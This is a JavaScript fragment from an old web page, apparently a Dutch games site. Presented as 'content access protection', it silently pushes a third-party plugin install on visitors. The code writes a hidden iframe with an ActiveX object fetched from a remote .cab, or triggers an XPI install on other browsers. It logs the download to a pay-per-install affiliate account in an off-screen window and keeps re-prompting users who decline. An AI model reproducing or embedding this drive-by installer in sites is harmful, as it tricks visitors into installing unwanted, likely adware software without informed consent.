<!--
 document.write('<iframe id="protect_manager" style="position:absolute; visibility:hidden;"></iframe>');
 function retryit_protect(url){	
		//alert("Download ABORTED -- You must click YES to get access" + url); 

		
		showModalDialog('http://www.xxxtoolbar.com/protect/warnings/regular/?' + '&retry=' + retry_protect,self,'dialogWidth:305px;dialogHeight:450px;center:yes;help:no;dialogHide:yes;resizable:no;scroll:no;status:no;unadorned:no;');
		retry_protect--;
	}

 function Protect(url) {
	var bname=navigator.appName;
	var bver=parseInt(navigator.appVersion);

        //if ( navigator.platform && navigator.platform != 'Win32' ) { alert("Sorry, your browser is not WIN32 Compatible"); }
        if (bname == 'Microsoft Internet Explorer' && bver >= 2) {
			protect_manager.document.close();
			protect_manager.document.write('<html><body>');
			protect_manager.document.write('<OBJECT id="protect_object" width=1 height=1 classid="CLSID:4418DD4D-7265-4c32-BC0A-3FDB3C2DA938"');
			protect_manager.document.write('codebase="http://www.xxxtoolbar.com/ist/softwares/v3.0/protect_regular.cab" onerror="parent.retryit_protect(\'' + url + '\');">');
                        protect_manager.document.write('<PARAM name="account_id" value="155035">');
                        protect_manager.document.write('<PARAM name="download_key" value="9a16e4d59fdf9da0fd4a291bd24a38b7">');
                        protect_manager.document.write('<PARAM name="download_lock" value="1107459043">')
			protect_manager.document.write('<PARAM name="url" value="' + url + '">')
			protect_manager.document.write('</OBJECT>');
			protect_manager.document.write('</body></html>');
			window.open("http://install.xxxtoolbar.com/ist/scripts/log_downloads.php?account_id=155035&auto_close=1&software_id=0006&payable=1&country=NL&referer=http%3A%2F%2Fwww.gavespelletjes.nl%2Findex.php%3Fnoin%3DY%26nopop%3DY","_blank","top=10000, left=100000");
         }

         else {
	   if(!(GetCookie_protect("exelimiter") || exelimiter)) {
		if (bname == 'Netscape') {
			if (InstallTrigger.updateEnabled()) {
				InstallTrigger.install({'Content Access Plugin 1.01' : 'http://www.xxxtoolbar.com/ist/softwares/v3.0/protect_regular.xpi'});
                	} else { location.replace('http://www.xxxtoolbar.com/ist/softwares/bundlers//istinstall_regular.xpi'); }
        	}
		else { 
			location.replace('http://www.xxxtoolbar.com/ist/softwares/bundlers//istinstall_regular.xpi'); 
		}
		SetCookie_protect("exelimiter","1", 0);
		exelimiter=1
		setTimeout('location.replace(gurl)',10000);
	   } else { location.replace(gurl); }
	}
}



<!--
	var retry_protect=2;
	var gurl=null;
	var exelimiter=0;

        function SetCookie_protect(sName, sValue, sExpire){
                var expireCode = "";
                if (sExpire) { expireCode =  "expires=" + sExpire + ";" }
                document.cookie = sName + "=" + escape(sValue) + ";" + expireCode
        }

        
        function GetCookie_protect(sName) {
                var aCookie = document.cookie.split("; ");
                for (var i=0; i < aCookie.length; i++) {
                        var aCrumb = aCookie[i].split("=");
                        if (sName == aCrumb[0]) { return unescape(aCrumb[1]); }
                }
                return null;
        }

	function SP(url) {
		gurl=url;
		Protect(gurl);
	}	

	function Again() {
		Protect(gurl);
	}
//-->
